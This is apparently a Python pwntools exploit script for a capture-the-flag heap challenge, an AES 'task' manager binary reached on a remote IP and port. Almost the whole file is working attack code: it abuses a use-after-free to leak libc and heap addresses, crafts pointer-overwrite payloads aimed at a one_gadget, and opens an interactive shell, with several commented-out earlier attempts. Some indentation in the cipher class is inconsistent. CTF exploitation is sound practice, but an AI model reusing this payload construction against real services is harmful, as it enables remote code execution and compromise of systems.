from pwn import *
from ctypes import *
import os
from Crypto.Cipher import AES
from binascii import b2a_hex, a2b_hex
#import roputils as rop

remote_addr = "111.186.63.201"
remote_port = 10001

local_addr = "127.0.0.1"
local_port = 1807

pc = "./task"
pwn_elf = ELF(pc)
pwn_rop = rop.ROP(pc)

uselibc = 2 #0 for no,1 for i386,2 for x64
local = 0
haslibc = 1
atta = 0

if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.28.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.28.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
	else:
		p = process(pc)
elif local == 0:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')
else:
	p = remote(local_addr,local_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		#gdb.attach(p,'b *0x1253+0x555555554000\nb*0x1353+0x555555554000')
		#gdb.attach(p,'b*0x0000000000001522+0x555555554000\n')
		#0x555555554000+0x00000000000014f3
		#0x0000000000001258+0x555555554000
		#gdb.attach(p,'b *0x555555554000+0x00000000000014f3\n b*0x00000000000014AA+0x555555554000\n b*0x555555554000+0x00000000000012FA')
		#0x15c6+0x555555554000
		#0x555555554000+0x1603
		gdb.attach(p,'c')

def sla(a,b):
	p.sendlineafter(a,b)

def sa(a,b):
	p.sendafter(a,b)

def ru(a):
	return p.recvuntil(a)

def rl():
	return p.recvline()

def rv(a):
	return p.recv(a)

def sn(a):
	p.send(a)

def sl(a):
	p.sendline(a)

def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def add_task(id,size,data,f):
	sla('Choice: ','1')
	sla('id : ',str(id))
	sla('Decrypt(2): ','1')
	sa('Key : ','1'*0x20)
	sa('IV : ','\x00'*0x10)
	sla('Size : ',str(size))
	if f==1:
		sleep(2)
	sa('Data : ',data)

def delete_task(id):
	sla('Choice: ','2')
	sla('id : ',str(id))

def go(id):
	sla('Choice: ','3')
	sla('id : ',str(id))


class prpcrypt():
    def __init__(self, key,iv):
        self.key = key
        self.mode = AES.MODE_CBC
    	self.iv = iv 
    def encrypt(self, text):
        cryptor = AES.new(self.key, self.mode, self.iv)
        length = 16
        count = len(text)
	if(count % length != 0) :
        	add = length - (count % length)
	else:
		add = 0
        text = text + ('\x00' * add)
        self.ciphertext = cryptor.encrypt(text)
        return b2a_hex(self.ciphertext)
     
    def decrypt(self, text):
        cryptor = AES.new(self.key, self.mode, self.iv)
        plain_text = cryptor.decrypt(a2b_hex(text))
        return plain_text.rstrip('\x00')

def data_decrypt(l):
	ru('Ciphertext: \n')
	cipher = ''
	for i in range(l):
		data = rl()
		data = data.strip('\n')
		data = data.split(' ')
		for j in data:
			cipher += j
	print cipher
	print len(cipher)
	aes_p = prpcrypt('1'*0x20,'\x00'*0x10)
	return aes_p.decrypt(cipher)

def hack():
	raw_input()
	add_task(0,0x90,'1'*0x90,0)
	add_task(1,0x1000,'1'*0x1000,0)
	add_task(2,0x500,'1'*0x500,0)
	#add_task(3,0x90,'1'*0x90,0)
	#add_task(4,0x90,'1'*0x90,0)
	
	add_task(10,0x20,'1'*0x20,0)
	delete_task(2)
	go(1)
	delete_task(1)
	add_task(1,0x9e0,'1'*0x9e0,1)
	d = data_decrypt(50)
	print d
	libc.address =  u64(d[:8]) - libc.symbols['__malloc_hook'] - 0x680 - 0x10
	lg('libc',libc.address)
	malloc_hook = libc.symbols['__malloc_hook']
	lg('malloc_hook',malloc_hook)
	heap_addr = u64(d[16:24])
	lg('heap_addr',heap_addr)
	lg('cipher',0x202030+0x555555554000)
	system_addr = libc.symbols['system']
	one_gadget = libc.address + 0x10a38c
	lg('one_gadget',one_gadget)


	#add_task(2,0x500,'1'*0x500,0)
	#raw_input()
	payload = p64(heap_addr+0xa00) + p64(0) + p64(1) + p64(0)*10 + p64(0x20) + p64(0) + p64(heap_addr+0xa00)
	payload += p64(0xf00000000) + p64(0)*3
	add_task(5,0xa0,payload,0)
	payload = '1'*0x20 + p64(one_gadget)*26 + p64(0xd) + p64(0) + p64(one_gadget)
	add_task(6,0x108,payload,0)

	#raw_input()
	add_task(3,0x90,'1'*0x90,0)
	add_task(4,0x70,'1'*0x70,0)
	go(4)
	delete_task(4)
	delete_task(3)
	sla('Choice: ','1')
	sla('id : ','3')
	sla('Decrypt(2): ','1')
	sa('Key : ','1'*0x20)
	sa('IV : ','\x00'*0x10)
	sla('Size : ',str(0x70))
	payload = p64(heap_addr) + p64(0x30) + p32(1) + '1'*0x20 + '\x00'*0x10 + '\x00'*0x14
	payload += p64(heap_addr +0x1370+0x10) + p64(4) + p64(0)
	sa('Data : ',payload)
	
	'''
	raw_input()
	

	add_task(5,0xc0,'1'*0xc0,0)
	add_task(6,0x70,'1'*0x70,0)
	go(6)
	delete_task(6)
	delete_task(5)
	sla('Choice: ','1')
	sla('id : ','5')
	sla('Decrypt(2): ','2')
	sa('Key : ','1'*0x20)
	sa('IV : ','\x00'*0x10)
	sla('Size : ',str(0x70))
	payload = p64(heap_addr-0x1530) + p64(0x1010+0x250) + p32(2) + '1'*0x20 + '\x00'*0x10 + '\x00'*0x14
	payload += p64(heap_addr + 0x14a0) + p64(6) + p64(0)
	sa('Data : ',payload)
	
	#d = data_decrypt(50)
	#sleep(2)
	'''










	'''
	add_task(0,0x90,'1'*0x90,0)
	add_task(1,0x90,'1'*0x90,0)
	add_task(2,0x1000,'1'*0x1000,0)
	add_task(3,0x90,'1'*0x90,0)
	delete_task(1)
	go(0)
	delete_task(0)
	add_task(0,0x90,'1'*0x90,1)
	
	d = data_decrypt(10)
	print d
	heap_addr = u64(d[:8])
	lg('heap_addr',heap_addr)

	add_task(1,0x90,'1'*0x90,0)
	#raw_input()
	delete_task(2)
	add_task(4,0x90,'1'*0x90,0)
	add_task(5,0x70,'1'*0x70,0)
	go(5)
	delete_task(5)
	delete_task(4)
	sla('Choice: ','1')
	sla('id : ','4')
	sla('Decrypt(2): ','1')
	sa('Key : ','1'*0x20)
	sa('IV : ','\x00'*0x10)
	sla('Size : ',str(0x70))
	payload = p64(heap_addr+0x760) + p64(0x10) + p32(1) + '1'*0x20 + '\x00'*0x10 + '\x00'*0x14
	payload += p64(heap_addr+0x120) + p64(0)
	sa('Data : ',payload)
	#sleep(2)
	d = data_decrypt(2)
	libc.address =  u64(d[:8]) - libc.symbols['__malloc_hook'] - 0x60 - 0x10
	lg('libc',libc.address)
	'''
	#image_addr =  u64(d[0x68:0x70])
	#lg('image',image_addr)
	#sleep(2)
	#go(1)


	p.interactive()

hack()


